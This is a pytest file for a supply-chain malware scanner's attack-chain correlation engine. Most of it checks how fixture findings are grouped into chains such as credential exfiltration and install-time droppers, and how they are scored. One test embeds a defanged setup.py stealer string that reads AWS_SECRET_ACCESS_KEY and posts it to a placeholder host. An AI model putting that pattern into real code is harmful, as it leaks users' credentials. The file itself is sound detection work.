"""Tests for the attack-chain correlation engine (app.analysis.correlation).

Fixture note: every ``Finding`` built with ``F(...)`` below is a hand-written test fixture shaped
like analyzer output (codes, confidences, ``location`` and ``evidence["locations"]``); none is
a real scan result. Source snippets passed to the real analyzers are synthetic: the benign ones
are modelled on common SDK / CLI / upload-tool code, the malicious one on published install-time
credential stealers and is defanged (``example.invalid``). Analyzers only parse source with
``ast``; nothing here is executed, imported or installed, and no test touches the network.
"""

from __future__ import annotations

import json
import random
import time
from dataclasses import asdict

import pytest

from app.analysis import orchestrator as orch
from app.analysis import scoring, taxonomy
from app.analysis.analyzers.base import BaseAnalyzer, PackageContext, SourceFile
from app.analysis.analyzers.install_script import InstallScriptAnalyzer
from app.analysis.analyzers.obfuscation import ObfuscationAnalyzer
from app.analysis.analyzers.static_code import StaticCodeAnalyzer
from app.analysis.correlation import chains as chain_defs
from app.analysis.correlation import engine
from app.analysis.correlation.chains import TEMPLATES, ChainTemplate, StepSpec, validate_templates
from app.analysis.correlation.engine import VERSION, correlate
from app.analysis.findings import Finding, Location, Severity
from app.analysis.orchestrator import Orchestrator
from app.analysis.signals import Code

SETUP = "demo-1.0/setup.py"


# --------------------------------------------------------------------------- helpers
def F(code, confidence, file=None, *, line=None, locations=None, context=None, severity=Severity.medium,
      weight=1.0, analyzer="fixture", evidence=None) -> Finding:
    """Test fixture finding (see module docstring)."""
    ev = dict(evidence or {})
    if locations is not None:
        ev["locations"] = [loc if isinstance(loc, dict) else {"file": loc[0], "line": loc[1]} for loc in locations]
    if context is not None:
        ev["context"] = context
    return Finding(
        code, severity, weight, f"fixture {code}", ev, confidence=confidence,
        location=Location(file=file, line=line) if file else None,
    ).with_defaults(analyzer=analyzer, analyzer_version="0-test")


def chain_ids(result) -> list[str]:
    return [c.chain_id for c in result.chains]


def only_chain(result, chain_id):
    [chain] = [c for c in result.chains if c.chain_id == chain_id]
    [finding] = [f for f in result.findings if f.finding_id == chain.finding_id]
    return chain, finding


def ctx_with(files: dict[str, str], name="demo") -> PackageContext:
    return PackageContext(ecosystem="pypi", name=name, version="1.0",
                          files=[SourceFile(path, text, len(text)) for path, text in files.items()])


def run_real_analyzers(files: dict[str, str], name="demo") -> list[Finding]:
    ctx = ctx_with(files, name)
    out: list[Finding] = []
    for analyzer in (StaticCodeAnalyzer(), InstallScriptAnalyzer(), ObfuscationAnalyzer()):
        out.extend(f.with_defaults(analyzer=analyzer.name, analyzer_version=analyzer.version)
                   for f in analyzer.analyze(ctx))
    return out


# --------------------------------------------------------------------------- templates
def test_templates_cover_the_required_patterns_and_validate():
    assert {t.chain_id for t in TEMPLATES} == {
        "credential_exfiltration", "install_time_dropper", "obfuscated_loader", "persistence_implant",
        "typosquat_payload", "dependency_confusion_payload", "takeover_behavior_change", "hidden_native_payload",
    }
    validate_templates(TEMPLATES)
    for t in TEMPLATES:
        for step in t.steps:
            if step.technique_id:
                assert step.technique_name == taxonomy.ATTACK_TECHNIQUES[step.technique_id]
            assert step.codes_any <= set(vars(Code).values())


def test_validate_templates_rejects_unsound_templates():
    ok = chain_defs._step(1, chain_defs.EXECUTION, "T1059", {Code.SUBPROCESS_EXEC}, description="x")
    overlapping = chain_defs._step(2, chain_defs.EXECUTION, "T1059", {Code.SUBPROCESS_EXEC}, description="y")
    with pytest.raises(ValueError, match="share codes"):
        validate_templates([ChainTemplate("x", "X", Severity.high, (ok, overlapping))])
    bad_technique = chain_defs._step(2, chain_defs.EXECUTION, "T9999", {Code.DYNAMIC_EXEC}, description="y")
    with pytest.raises(ValueError, match="unknown ATT&CK technique"):
        validate_templates([ChainTemplate("x", "X", Severity.high, (ok, bad_technique))])
    optional = chain_defs._step(1, chain_defs.EXECUTION, "T1059", {Code.DYNAMIC_EXEC}, required=False, description="")
    with pytest.raises(ValueError, match="required step"):
        validate_templates([ChainTemplate("x", "X", Severity.high, (optional,))])
    with pytest.raises(ValueError, match="duplicate"):
        validate_templates([ChainTemplate("x", "X", Severity.high, (ok,)), ChainTemplate("x", "X", Severity.high,
                                                                                         (ok,))])


# --------------------------------------------------------------------------- positive: credential_exfiltration
def test_credential_exfiltration_in_setup_py_full_contract():
    install = F(Code.INSTALL_HOOK_EXEC, 0.85, SETUP, line=2, severity=Severity.critical, weight=12.0)
    env = F(Code.ENV_HARVEST, 0.65, SETUP, line=5, severity=Severity.critical)
    net = F(Code.NETWORK_EGRESS, 0.5, SETUP, line=3, severity=Severity.low)
    result = correlate([install, env, net])

    assert chain_ids(result) == ["credential_exfiltration"]
    chain, finding = only_chain(result, "credential_exfiltration")
    # base mean(0.65, 0.5) = 0.575; +0.08 install booster; +0.07 co-located; +0.05 install-time.
    assert chain.confidence == pytest.approx(0.775)
    assert chain.severity == Severity.critical
    assert chain.colocated_file == SETUP and chain.install_time is True
    assert [(s.order, s.tactic, s.technique_id) for s in chain.steps] == [
        (1, "execution", "T1059.006"), (2, "credential_access", "T1552"), (3, "exfiltration", "T1041"),
    ]
    assert chain.steps[1].technique_name == "Unsecured Credentials"
    assert set(chain.finding_ids) == {install.finding_id, env.finding_id, net.finding_id}
    assert chain.attack == ("T1059.006", "T1552", "T1041")

    assert finding.code == Code.ATTACK_CHAIN
    assert finding.severity == Severity.critical and finding.weight == 12.0
    assert finding.confidence == chain.confidence
    assert finding.category == "attack_chain" and finding.provenance == "correlation"
    assert finding.analyzer == "correlation" and finding.analyzer_version == VERSION
    assert finding.related == chain.finding_ids
    assert finding.attack == chain.attack
    assert finding.location == Location(file=SETUP)  # file only: no line is invented
    assert finding.evidence == {
        "chain_id": "credential_exfiltration", "title": "Credential theft and exfiltration",
        "step_codes": [[Code.INSTALL_HOOK_EXEC], [Code.ENV_HARVEST], [Code.NETWORK_EGRESS]],
    }
    assert finding.title == "Credential theft and exfiltration"
    assert finding.remediation  # taxonomy defaults filled

    data = chain.to_dict()
    assert data["finding_id"] == finding.finding_id and data["id"] == data["chain_id"] == "credential_exfiltration"
    assert data["context"] == {"install_time": True, "variant": "default"}
    assert set(data) >= {"chain_id", "title", "summary", "severity", "confidence", "finding_id", "finding_ids",
                         "attack", "steps", "colocated_file", "context"}
    assert set(data["steps"][0]) == {"order", "tactic", "technique_id", "technique_name", "description",
                                     "finding_ids"}
    assert "co-located in demo-1.0/setup.py" in data["summary"] and len(data["summary"]) <= 300
    assert orch._chain_dict(chain) == data  # already sanitised: the orchestrator glue is a no-op
    json.dumps(data)


def test_credential_exfiltration_anchored_by_strong_ioc_in_the_same_file():
    ioc = F(Code.IOC_MATCH, 0.95, "pkg/__init__.py", line=9, severity=Severity.critical, weight=12.0)
    env = F(Code.ENV_HARVEST, 0.65, "pkg/__init__.py", line=4)
    chain, _ = only_chain(correlate([ioc, env]), "credential_exfiltration")
    assert chain.confidence == pytest.approx(0.87)  # mean(0.95, 0.65) + 0.07 co-located
    assert chain.install_time is False
    assert chain.steps[-1].technique_id == "T1041"

    # The same two findings in different files: the capability-grade credential step has no placement
    # corroboration, so no chain.
    apart = [F(Code.IOC_MATCH, 0.95, "pkg/net.py"), F(Code.ENV_HARVEST, 0.65, "pkg/creds.py")]
    assert correlate(apart).chains == []


def test_credential_exfiltration_from_real_analyzers_on_a_synthetic_stealer():
    malicious_setup = (
        "# Synthetic, defanged sample modelled on install-time credential stealers. Parsed, never executed.\n"
        "import os\n"
        "import urllib.request\n"
        "from setuptools import setup\n"
        "\n"
        "secret = os.environ['AWS_SECRET_ACCESS_KEY']\n"
        "urllib.request.urlopen('https://collector.example.invalid/c', data=secret.encode())\n"
        "setup(name='demo-helper', version='0.0.1')\n"
    )
    findings = run_real_analyzers({"demo-helper-0.0.1/setup.py": malicious_setup,
                                   "demo-helper-0.0.1/demo_helper/__init__.py": "VERSION = '0.0.1'\n"})
    result = correlate(findings)
    chain, finding = only_chain(result, "credential_exfiltration")
    assert chain.colocated_file == "demo-helper-0.0.1/setup.py"
    assert chain.install_time is True
    assert chain.severity == Severity.critical and chain.confidence >= 0.7
    assert set(chain.finding_ids) <= {f.finding_id for f in findings}


# --------------------------------------------------------------------------- positive: other templates
def test_install_time_dropper_download_variant():
    install = F(Code.INSTALL_HOOK_EXEC, 0.85, SETUP, severity=Severity.critical)
    download = F(Code.SUSPICIOUS_DOWNLOAD, 0.9, "demo-1.0/demo/_bootstrap.py", severity=Severity.critical)
    chain, finding = only_chain(correlate([install, download]), "install_time_dropper")
    assert chain.variant == "download_execute" and chain.severity == Severity.critical
    assert chain.confidence == pytest.approx(0.925)  # mean(0.85, 0.9) + 0.05 install-time
    assert chain.colocated_file is None and finding.location is None
    assert chain.attack == ("T1059.006", "T1105")


def test_install_time_dropper_fetch_and_exec_variant_requires_one_file():
    install = F(Code.INSTALL_HOOK_EXEC, 0.6, SETUP, evidence={"hook": "cmdclass"})
    net = F(Code.NETWORK_EGRESS, 0.5, SETUP)
    proc = F(Code.SUBPROCESS_EXEC, 0.55, SETUP)
    chain, finding = only_chain(correlate([install, net, proc]), "install_time_dropper")
    assert chain.variant == "fetch_and_exec"
    assert chain.confidence == pytest.approx(0.67)  # mean(0.6, 0.5, 0.55) + 0.07 + 0.05
    assert chain.severity == Severity.high and finding.weight == 8.0
    assert chain.to_dict()["context"]["variant"] == "fetch_and_exec"


def test_obfuscated_loader_encoded_exec_is_a_single_strong_step():
    loader = F(Code.ENCODED_EXEC, 0.9, "pkg/__init__.py", line=3, severity=Severity.critical)
    chain, _ = only_chain(correlate([loader]), "obfuscated_loader")
    assert chain.variant == "encoded_exec" and chain.confidence == pytest.approx(0.9)
    assert [s.technique_id for s in chain.steps] == ["T1140", "T1059.006"]
    assert all(s.finding_ids == (loader.finding_id,) for s in chain.steps)


def test_obfuscated_loader_obfuscated_dynamic_exec_variant():
    blob = F(Code.OBFUSCATION, 0.7, "pkg/a.py", severity=Severity.high)
    reflect = F(Code.REFLECTION_ABUSE, 0.75, "pkg/b.py", severity=Severity.high)
    chain, _ = only_chain(correlate([blob, reflect]), "obfuscated_loader")
    assert chain.variant == "obfuscated_dynamic_exec"
    assert chain.severity == Severity.high and chain.confidence == pytest.approx(0.725)


def test_persistence_implant_and_mechanism_technique():
    persistence = F(Code.PERSISTENCE, 0.9, "pkg/__init__.py", severity=Severity.critical,
                    evidence={"target": "~/.bashrc"})
    net = F(Code.NETWORK_EGRESS, 0.5, "pkg/__init__.py")
    chain, _ = only_chain(correlate([persistence, net]), "persistence_implant")
    assert chain.confidence == pytest.approx(0.77)  # mean(0.5, 0.9) + 0.07 co-located (strong anchor there)
    assert [(s.tactic, s.technique_id) for s in chain.steps] == [
        ("command_and_control", "T1071.001"), ("persistence", "T1546.004"),
    ]


@pytest.mark.parametrize("evidence, attack, expected", [
    ({"path": "/etc/cron.d/updater"}, (), "T1053.003"),
    ({"unit": "/etc/systemd/system/x.service"}, (), "T1543.002"),
    ({"key": "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run"}, (), "T1547.001"),
    ({"a": "crontab -l", "b": "~/.bashrc"}, (), None),  # ambiguous: never guessed
    ({}, (), None),
    ({}, ("T1543.002",), "T1543.002"),  # the finding's own single mapping wins
])
def test_persistence_technique_resolution(evidence, attack, expected):
    step = next(s for t in TEMPLATES if t.chain_id == "persistence_implant" for s in t.steps
                if Code.PERSISTENCE in s.codes_any)
    finding = Finding(Code.PERSISTENCE, Severity.critical, 9.0, "fixture", evidence, confidence=0.9,
                      attack=attack)
    assert engine.resolve_technique(step, finding) == ("persistence", expected)


def test_typosquat_payload():
    squat = F(Code.TYPOSQUAT, 0.9, severity=Severity.critical, evidence={"target": "requests", "distance": 1})
    install = F(Code.INSTALL_HOOK_EXEC, 0.85, SETUP, severity=Severity.critical)
    chain, _ = only_chain(correlate([squat, install]), "typosquat_payload")
    assert chain.confidence == pytest.approx(0.925)
    assert [(s.tactic, s.technique_id) for s in chain.steps] == [
        ("initial_access", "T1195.001"), ("execution", "T1059.006"),
    ]


def test_dependency_confusion_payload_with_install_vector():
    confusion = F(Code.DEPENDENCY_CONFUSION, 0.8, severity=Severity.critical)
    install = F(Code.INSTALL_HOOK_EXEC, 0.85, "acme-internal-9.9.9/setup.py", severity=Severity.critical)
    chain, _ = only_chain(correlate([confusion, install]), "dependency_confusion_payload")
    assert chain.confidence == pytest.approx(0.875) and chain.severity == Severity.critical


def test_dependency_confusion_payload_with_network_in_root_setup_script():
    # Network egress (capability-grade) corroborated by install-time placement: root setup.py.
    collision = F(Code.NAMESPACE_COLLISION, 0.9, severity=Severity.high)
    net = F(Code.NETWORK_EGRESS, 0.5, "acme-internal-9.9.9/setup.py", line=4)
    chain, _ = only_chain(correlate([collision, net]), "dependency_confusion_payload")
    assert chain.confidence == pytest.approx(0.75)  # mean(0.9, 0.5) + 0.05 install-time
    assert chain.install_time is True
    assert chain.steps[1].tactic == "exfiltration"


def test_takeover_behavior_change():
    changed = F(Code.MAINTAINER_CHANGED, 0.8, severity=Severity.high)
    drift = F(Code.BEHAVIOR_DRIFT, 0.8, severity=Severity.high)
    chain, _ = only_chain(correlate([changed, drift]), "takeover_behavior_change")
    assert chain.severity == Severity.high and chain.confidence == pytest.approx(0.8)
    assert chain.attack == ("T1195.001",)


def test_hidden_native_payload_variants():
    binary = F(Code.BINARY_EXECUTABLE, 0.85, "demo-1.0/demo/data/logo.png", severity=Severity.high,
               evidence={"disguised": True})
    native = F(Code.NATIVE_CODE_LOADING, 0.55, SETUP)
    chain, _ = only_chain(correlate([binary, native]), "hidden_native_payload")
    assert chain.variant == "native_loading" and chain.confidence == pytest.approx(0.75)
    assert chain.attack == ("T1027.009", "T1129")

    proc = F(Code.SUBPROCESS_EXEC, 0.55, SETUP)
    chain, _ = only_chain(correlate([binary, proc]), "hidden_native_payload")
    assert chain.variant == "install_time_process" and chain.severity == Severity.high


# --------------------------------------------------------------------------- false-positive guards
@pytest.mark.parametrize("env_confidence", [0.65, 0.9, 0.97])
def test_sdk_reading_aws_env_and_calling_https_in_another_file_yields_no_chain(env_confidence):
    env = F(Code.ENV_HARVEST, env_confidence, "cloudsdk-1.0/cloudsdk/credentials.py", line=12,
            evidence={"sensitive": ["AWS_ACCESS_KEY_ID", "AWS_SECRET_ACCESS_KEY"]})
    net = F(Code.NETWORK_EGRESS, 0.5, "cloudsdk-1.0/cloudsdk/endpoint.py", line=3)
    cmdclass = F(Code.INSTALL_HOOK_EXEC, 0.6, "cloudsdk-1.0/setup.py", evidence={"hook": "cmdclass"})
    assert correlate([env, net]).chains == []
    assert correlate([env, net, cmdclass]).chains == []


def test_sdk_colocated_capabilities_without_install_or_evasion_context_yield_no_chain():
    creds = "cloudsdk-1.0/cloudsdk/credentials.py"
    findings = [F(Code.ENV_HARVEST, 0.65, creds), F(Code.NETWORK_EGRESS, 0.5, creds),
                F(Code.INSTALL_HOOK_EXEC, 0.6, "cloudsdk-1.0/setup.py"),  # weak hook in a different file
                F(Code.OBFUSCATION, 0.6, "cloudsdk-1.0/cloudsdk/data/certs.py")]  # blob in a different file
    assert correlate(findings).chains == []


def test_sdk_like_package_through_real_analyzers_yields_no_chain():
    files = {
        "cloudsdk-1.0/setup.py": (
            "from setuptools import setup\n"
            "from setuptools.command.build_py import build_py\n\n"
            "class BuildPy(build_py):\n"
            "    def run(self):\n"
            "        super().run()\n\n"
            "setup(name='cloudsdk', version='1.0', cmdclass={'build_py': BuildPy})\n"
        ),
        "cloudsdk-1.0/cloudsdk/credentials.py": (
            "import os\n\n"
            "class EnvironmentCredentials:\n"
            "    def load(self):\n"
            "        access_key = os.environ['AWS_ACCESS_KEY_ID']\n"
            "        secret_key = os.getenv('AWS_SECRET_ACCESS_KEY')\n"
            "        return access_key, secret_key\n"
        ),
        "cloudsdk-1.0/cloudsdk/endpoint.py": (
            "import json\n"
            "import urllib.request\n\n"
            "def send(url, payload, timeout=10):\n"
            "    body = json.dumps(payload).encode()\n"
            "    request = urllib.request.Request(url, data=body, method='POST')\n"
            "    with urllib.request.urlopen(request, timeout=timeout) as response:\n"
            "        return json.loads(response.read())\n"
        ),
        "cloudsdk-1.0/tests/test_credentials.py": (
            "import os\n\n"
            "def test_env(monkeypatch):\n"
            "    monkeypatch.setenv('AWS_SECRET_ACCESS_KEY', 'fixture')\n"
            "    assert os.environ['AWS_SECRET_ACCESS_KEY'] == 'fixture'\n"
        ),
    }
    findings = run_real_analyzers(files, name="cloudsdk")
    assert {Code.ENV_HARVEST, Code.NETWORK_EGRESS} <= {f.code for f in findings}  # the capabilities are seen
    assert correlate(findings).chains == []


def test_cli_tool_with_process_and_network_in_one_module_yields_no_chain():
    files = {
        "devtool-2.0/setup.py": (
            "from setuptools import setup\n"
            "from setuptools.command.install import install\n\n"
            "class Install(install):\n"
            "    pass\n\n"
            "setup(name='devtool', cmdclass={'install': Install})\n"
        ),
        "devtool-2.0/devtool/cli.py": (
            "import subprocess\n"
            "import requests\n\n"
            "def self_update(index_url):\n"
            "    latest = requests.get(index_url, timeout=5).json()['version']\n"
            "    subprocess.run(['pip', 'install', f'devtool=={latest}'], check=True)\n"
        ),
    }
    findings = run_real_analyzers(files, name="devtool")
    assert {Code.SUBPROCESS_EXEC, Code.NETWORK_EGRESS, Code.INSTALL_HOOK_EXEC} <= {f.code for f in findings}
    assert correlate(findings).chains == []


def test_upload_tool_reading_pypirc_and_posting_yields_no_chain():
    # FS_SENSITIVE (0.7, credential_access) + network in the same module, as in upload/SSH tools.
    upload = (
        "import configparser\n"
        "import os\n"
        "import requests\n\n"
        "def upload(dist_path, repository='pypi'):\n"
        "    config = configparser.ConfigParser()\n"
        "    config.read(os.path.expanduser('~/.pypirc'))\n"
        "    section = config[repository]\n"
        "    with open(dist_path, 'rb') as handle:\n"
        "        return requests.post(section['repository'], files={'content': handle}, timeout=30)\n"
    )
    findings = run_real_analyzers({"uploader-3.0/uploader/upload.py": upload}, name="uploader")
    assert {Code.FS_SENSITIVE, Code.NETWORK_EGRESS} <= {f.code for f in findings}
    assert correlate(findings).chains == []


def test_findings_only_in_test_files_yield_no_chain():
    findings = [
        F(Code.ENV_HARVEST, 0.9, "pkg-1.0/tests/test_credentials.py", severity=Severity.critical),
        F(Code.IOC_MATCH, 0.95, "pkg-1.0/tests/test_credentials.py", severity=Severity.critical),
        F(Code.INSTALL_HOOK_EXEC, 0.85, "pkg-1.0/tests/fixtures/setup.py", severity=Severity.critical),
        F(Code.ENCODED_EXEC, 0.9, "pkg-1.0/conftest.py", severity=Severity.critical),
        F(Code.SUSPICIOUS_DOWNLOAD, 0.9, "pkg-1.0/pkg/helpers_test.py", severity=Severity.critical),
        F(Code.LAYERED_ENCODING, 0.9, "pkg-1.0/pkg/runner.py", context="test"),  # analyzer-declared context
        F(Code.OBFUSCATION, 0.9, locations=[{"file": "pkg-1.0/pkg/samples.py", "line": 1, "context": "test"}]),
    ]
    assert correlate(findings).chains == []


def test_mixed_test_and_source_locations_keep_only_source_files():
    loader = F(Code.ENCODED_EXEC, 0.9, "pkg-1.0/tests/test_loader.py",
               locations=[("pkg-1.0/tests/test_loader.py", 3), ("pkg-1.0/pkg/core.py", 7)], severity=Severity.critical)
    chain, _ = only_chain(correlate([loader]), "obfuscated_loader")
    assert chain.colocated_file is None


@pytest.mark.parametrize("findings", [
    pytest.param([F(Code.LAYERED_ENCODING, 0.75, "pkg/resources.py")], id="single-step-not-strong"),
    pytest.param([F(Code.OBFUSCATION, 0.6, "pkg/templates.py"), F(Code.DYNAMIC_EXEC, 0.6, "pkg/templates.py")],
                 id="blob-and-exec-at-import-time"),
    pytest.param([F(Code.MAINTAINER_CHANGED, 0.6), F(Code.INSTALL_HOOK_EXEC, 0.85, SETUP)],
                 id="weak-takeover-signal"),
    pytest.param([F(Code.TYPOSQUAT, 0.9), F(Code.INSTALL_HOOK_EXEC, 0.6, SETUP)], id="typosquat-with-cmdclass"),
    pytest.param([F(Code.NAMESPACE_COLLISION, 0.9), F(Code.NETWORK_EGRESS, 0.5, "acme-client-1.0/acme/client.py")],
                 id="collision-with-runtime-network"),
    pytest.param([F(Code.PERSISTENCE, 0.75, "pkg/service.py"), F(Code.NETWORK_EGRESS, 0.5, "pkg/client.py")],
                 id="service-manager"),
    pytest.param([F(Code.BINARY_EXECUTABLE, 0.6, "pkg/_lib.so"), F(Code.NATIVE_CODE_LOADING, 0.55, "pkg/_native.py")],
                 id="bundled-native-library"),
    pytest.param([F(Code.BINARY_EXECUTABLE, 0.85, "pkg/x.png"), F(Code.SUBPROCESS_EXEC, 0.55, "pkg/cli.py")],
                 id="runtime-process-is-not-install-time"),
    pytest.param([F(Code.INSTALL_HOOK_EXEC, 0.6, SETUP), F(Code.NETWORK_EGRESS, 0.5, "demo-1.0/demo/net.py"),
                  F(Code.SUBPROCESS_EXEC, 0.55, "demo-1.0/demo/net.py")], id="dropper-not-colocated"),
    pytest.param([F(Code.INSTALL_HOOK_EXEC, 0.6, SETUP), F(Code.SUSPICIOUS_DOWNLOAD, 0.75, "demo-1.0/demo/x.py")],
                 id="install-vector-never-corroborates-itself"),
])
def test_weak_or_unplaced_combinations_yield_no_chain(findings):
    assert correlate(findings).chains == []


# --------------------------------------------------------------------------- confidence formula
def test_severity_downgrade_below_060_and_suppression_below_050():
    low = [F(Code.INSTALL_HOOK_EXEC, 0.45, SETUP), F(Code.NETWORK_EGRESS, 0.45, SETUP),
           F(Code.SUBPROCESS_EXEC, 0.45, SETUP)]
    chain, finding = only_chain(correlate(low), "install_time_dropper")
    assert chain.confidence == pytest.approx(0.57)
    assert chain.severity == Severity.medium and finding.weight == 4.0  # high template, one band lower

    lower = [F(Code.INSTALL_HOOK_EXEC, 0.35, SETUP), F(Code.NETWORK_EGRESS, 0.35, SETUP),
             F(Code.SUBPROCESS_EXEC, 0.35, SETUP)]
    assert correlate(lower).chains == []  # 0.35 + 0.12 = 0.47 < 0.5


def test_boosters_and_cap():
    env = F(Code.ENV_HARVEST, 0.8, "pkg/creds.py", severity=Severity.high)
    dns = F(Code.DNS_EXFILTRATION, 0.8, "pkg/dns.py", severity=Severity.critical)
    obfuscation = F(Code.OBFUSCATION, 0.6, "pkg/blob.py")
    pth = F(Code.PTH_STARTUP_HOOK, 0.9, "pkg.pth", severity=Severity.critical)

    def conf(findings):
        return only_chain(correlate(findings), "credential_exfiltration")[0].confidence

    assert conf([env, dns]) == pytest.approx(0.8)
    assert conf([env, dns, obfuscation]) == pytest.approx(0.88)
    assert conf([env, dns, pth]) == pytest.approx(0.93)  # booster + install-time
    assert conf([env, dns, pth, obfuscation]) == pytest.approx(0.97)  # 1.01 capped


# --------------------------------------------------------------------------- determinism / ids
def _stealer_findings() -> list[Finding]:
    return [
        F(Code.INSTALL_HOOK_EXEC, 0.85, SETUP, line=2, severity=Severity.critical),
        F(Code.ENV_HARVEST, 0.65, SETUP, line=5),
        F(Code.NETWORK_EGRESS, 0.5, SETUP, line=3),
        F(Code.ENCODED_EXEC, 0.9, "demo-1.0/demo/__init__.py", severity=Severity.critical),
        F(Code.TYPOSQUAT, 0.9, severity=Severity.critical),
        F(Code.NEW_PACKAGE, 0.4),
    ]


def _snapshot(result) -> str:
    return json.dumps([[c.to_dict() for c in result.chains], [f.to_dict() for f in result.findings]],
                      sort_keys=True)


def test_output_is_deterministic_and_independent_of_input_order():
    findings = _stealer_findings()
    expected = _snapshot(correlate(findings))
    # All critical: obfuscated_loader (0.9 + install and egress boosters + install-time, capped 0.97) and
    # typosquat_payload (0.9 + egress booster + install-time, capped 0.97) tie and sort by id; then
    # credential_exfiltration (0.575 + two boosters + co-located + install-time = 0.855).
    assert chain_ids(correlate(findings)) == ["obfuscated_loader", "typosquat_payload", "credential_exfiltration"]
    assert [c.confidence for c in correlate(findings).chains] == [0.97, 0.97, pytest.approx(0.855)]
    rng = random.Random(1234)
    for _ in range(10):
        shuffled = findings[:]
        rng.shuffle(shuffled)
        assert _snapshot(correlate(shuffled)) == expected
    assert _snapshot(correlate(findings + findings)) == expected  # duplicates collapse
    assert _snapshot(correlate(tuple(reversed(findings)))) == expected


def test_chain_ordering_is_severity_then_confidence_then_id():
    result = correlate(_stealer_findings())
    keys = [(-c.severity.rank, -c.confidence, c.chain_id) for c in result.chains]
    assert keys == sorted(keys)
    assert [f.finding_id for f in result.findings] == [c.finding_id for c in result.chains]


def test_chain_finding_id_is_stable_across_stamping_round_trips_and_confidence_changes():
    base = correlate(_stealer_findings())
    chain, finding = only_chain(base, "credential_exfiltration")
    assert finding.with_defaults(analyzer="correlation", analyzer_version=VERSION).finding_id == chain.finding_id
    assert Finding.from_dict(finding.to_dict()).finding_id == chain.finding_id

    retuned = [F(Code.ENV_HARVEST, 0.69, SETUP, line=5) if f.code == Code.ENV_HARVEST else f
               for f in _stealer_findings()]
    retuned_chain, _ = only_chain(correlate(retuned), "credential_exfiltration")
    assert retuned_chain.confidence != chain.confidence
    assert retuned_chain.finding_id == chain.finding_id

    # A different composition is a different chain.
    without_install = [f for f in _stealer_findings() if f.code != Code.INSTALL_HOOK_EXEC]
    other = correlate(without_install + [F(Code.OBFUSCATION, 0.6, SETUP)])
    other_chain, _ = only_chain(other, "credential_exfiltration")
    assert other_chain.finding_id != chain.finding_id


def test_existing_attack_chain_findings_are_not_rechained():
    first = correlate(_stealer_findings())
    again = correlate([*_stealer_findings(), *first.findings])
    assert _snapshot(again) == _snapshot(first)
    lone = Finding(Code.ATTACK_CHAIN, Severity.critical, 12.0, "fixture chain", {"chain_id": "x"}, confidence=0.97)
    assert correlate([lone]).chains == []


# --------------------------------------------------------------------------- hostile / malformed input
def test_malformed_items_never_raise_and_valid_findings_still_correlate():
    stealer = _stealer_findings()
    nan = F(Code.IOC_MATCH, 0.95, SETUP)
    object.__setattr__(nan, "confidence", float("nan"))
    broken_location = F(Code.DNS_EXFILTRATION, 0.9, SETUP)
    object.__setattr__(broken_location, "location", "not-a-location")
    no_evidence = F(Code.BROWSER_CREDENTIAL_ACCESS, 0.9, "pkg/b.py")
    object.__setattr__(no_evidence, "evidence", None)
    weird_locations = F(Code.PERSISTENCE, 0.9, evidence={
        "locations": [1, None, "pkg/a.py", {"file": 5}, {"file": ""}, {"file": "   "},
                      {"file": "pkg/a.py", "context": ["install", 7, None]}, {"file": "pkg/b.py", "context": {"x": 1}}],
        "context": {"nested": True},
    })
    string_locations = F(Code.SUSPICIOUS_DOWNLOAD, 0.9, evidence={"locations": "pkg/a.py", "file": ["x"]})
    items = [None, 42, "IOC_MATCH", object(), {"severity": "critical"}, {"code": Code.IOC_MATCH, "confidence": "x"},
             {"code": Code.NEW_PACKAGE, "confidence": 0.4}, nan, broken_location, no_evidence, weird_locations,
             string_locations, *stealer]
    result = correlate(items)
    assert "credential_exfiltration" in chain_ids(result)
    json.dumps([c.to_dict() for c in result.chains])
    assert correlate(None).chains == [] and correlate([]).chains == [] and correlate(iter(())).chains == []


def test_hostile_file_names_are_escaped_in_chain_output():
    hostile = "demo-1.0/\x1b[31mevil‮.py"
    findings = [F(Code.ENV_HARVEST, 0.65, hostile), F(Code.NETWORK_EGRESS, 0.5, hostile),
                F(Code.OBFUSCATION, 0.7, hostile)]
    chain, finding = only_chain(correlate(findings), "credential_exfiltration")
    for text in (chain.colocated_file, chain.summary, finding.location.file, json.dumps(chain.to_dict())):
        assert "\x1b" not in text and "‮" not in text


def test_work_and_output_are_bounded():
    many = [F(Code.NETWORK_EGRESS, 0.5, f"pkg/m{i}.py", evidence={"i": i}) for i in range(6000)]
    many += [F(Code.FS_SENSITIVE, 0.9, f"pkg/m{i}.py", evidence={"i": i}, severity=Severity.high) for i in range(50)]
    huge_locations = F(Code.ENV_HARVEST, 0.9, "pkg/m0.py", severity=Severity.high)
    object.__setattr__(huge_locations, "evidence",
                       {"locations": [{"file": f"pkg/deep{i}.py", "line": i + 1} for i in range(100_000)]})
    start = time.monotonic()
    result = correlate([*many, huge_locations])
    assert time.monotonic() - start < 20
    for chain in result.chains:
        assert len(chain.finding_ids) <= engine.MAX_CHAIN_FINDINGS
        assert all(len(step.finding_ids) <= engine.MAX_STEP_FINDINGS for step in chain.steps)


def test_at_most_max_chains_are_reported():
    step = StepSpec(order=1, tactic="execution", technique_id=None, technique_name=None,
                    codes_any=frozenset({Code.IOC_MATCH}))
    templates = [ChainTemplate(f"custom_{i:02d}", f"Custom {i}", Severity.high, (step,)) for i in range(30)]
    result = correlate([F(Code.IOC_MATCH, 0.95, "pkg/a.py", severity=Severity.critical)], templates=templates)
    assert len(result.chains) == engine.MAX_CHAINS == 20
    assert chain_ids(result) == [f"custom_{i:02d}" for i in range(20)]


def test_path_classifiers():
    assert engine.is_test_path("pkg-1.0/tests/test_x.py") and engine.is_test_path("a/__tests__/b.py")
    assert engine.is_test_path("pkg/test_utils.py") and engine.is_test_path("pkg/utils_test.py")
    assert engine.is_test_path("conftest.py") and engine.is_test_path("app/tests.py")
    assert not engine.is_test_path("numpy/testing/utils.py")  # importable runtime helpers are not tests
    assert not engine.is_test_path("pkg/contest.py") and not engine.is_test_path("")
    assert engine.is_root_setup_script("setup.py") and engine.is_root_setup_script("demo-1.0/setup.py")
    assert not engine.is_root_setup_script("demo-1.0/examples/setup.py")
    assert engine.is_root_setup_script("demo-helper-0.0.1/setup.py")
    assert not engine.is_root_setup_script("mypkg/setup.py")  # a module inside a wheel is not run by pip


def test_module_named_setup_in_a_wheel_is_not_install_time_context():
    collision = F(Code.NAMESPACE_COLLISION, 0.9)
    net = F(Code.NETWORK_EGRESS, 0.5, "acme_client/setup.py")
    assert correlate([collision, net]).chains == []


# --------------------------------------------------------------------------- analyzer context vocabulary
@pytest.mark.parametrize("label, expect_chain", [
    ("install_time", True),  # obfuscation / secrets / yara analyzers
    ("install-time", True),  # semgrep analyzer
    ("Install Time", True),
    ("interpreter_startup", True),  # yara analyzer: .pth, sitecustomize.py
